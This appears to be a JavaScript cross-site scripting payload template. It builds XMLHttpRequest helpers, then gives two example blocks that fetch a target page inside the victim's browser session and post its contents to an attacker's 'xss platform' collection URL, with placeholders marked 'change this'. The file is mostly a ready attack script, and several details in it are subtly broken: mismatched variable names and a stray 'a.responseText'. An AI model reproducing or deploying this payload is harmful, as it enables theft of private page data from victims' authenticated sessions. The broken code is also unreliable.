function initialize() {
	var xmlHttp;
	if (window.XMLHttpRequest)
	{// code for IE7+, Firefox, Chrome, Opera, Safari
  		xmlhttp=new XMLHttpRequest();
	}
	else
	{// code for IE6, IE5
  		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	}
	return xmlHttp;
}

function getSynchronous(url) {
	var xmlHttp=initialize();
	xmlhttp.open("GET",url,false);
	xmlhttp.send();
	return xmlhttp.responseText;
}

function postSynchronous(url, data, type) {
	var xmlHttp=initialize();
	xmlhttp.open("POST",url,false);
	xmlhttp.setRequestHeader("Content-type",type);
	xmlhttp.send(encodeURIComponent(data));
	return xmlhttp.responseText;
}

function getAsynchronous(url, callback) {
	var xmlHttp=initialize();
	xmlhttp.open("GET",url,true);
	xmlhttp.send();
	xmlhttp.onreadystatechange=function()
	{
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{
			if (callback) 
			{
				callback(xmlhttp.responseText);
			}
		}
	}
}

function postAsynchronous(url, data, type, callback) {
	var xmlHttp=initialize();
	xmlhttp.open("POST",url,true);
	xmlhttp.setRequestHeader("Content-type",type);
	xmlhttp.send(encodeURIComponent(data));
	xmlhttp.onreadystatechange=function()
	{
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{
			if (callback) 
			{
				callback(a.responseText);
			}
		}
	}
}

//Example1:Asynchronous
var xmlhttp;
var serverUrl = "https://<xss platform ip>/data"//change this
var targetUrl = "<target url>" + "?t=" + Math.random();//change this
getAsynchronous(targetUrl, function(responseText){postAsynchronous(serverUrl, "location=" + targetUrl + ";data=" + responseText, "application/x-www-form-urlencoded", "");});

//Example2:Synchronous
var xmlhttp;
var serverUrl = "https://<xss platform ip>/data";//change this
var targetUrl = "<target url>" + "?t=" + Math.random();//change this
responseData=getSynchronous(targetUrl);
postSynchronous(serverUrl,"location=" + targetUrl + ";data=" + responseData, "application/x-www-form-urlencoded");

